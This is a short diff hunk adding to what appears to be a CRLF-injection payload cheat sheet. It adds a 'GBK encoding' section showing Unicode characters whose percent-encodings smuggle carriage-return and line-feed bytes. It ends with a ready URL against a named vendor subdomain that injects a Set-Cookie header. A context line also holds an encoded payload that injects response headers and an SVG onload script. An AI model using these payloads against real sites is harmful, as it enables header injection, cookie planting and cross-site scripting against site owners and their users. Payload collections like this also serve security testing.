@@ -96,6 +96,19 @@ Using UTF-8 encoding
 %E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
 ```
 
+Using GBK encoding:
+
+```
+BeforeURL Encoding
+  Main Payload:- 嘍嘊
+  
+After URL Encoding
+  嘍 :- %E5%98%8D
+  嘊 :- %E5%98%8A
+  
+Final : https://subDomain.microsoft.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=thecyberneh
+```
+
 Remainder:
 
 * %E5%98%8A = %0A = \u560a
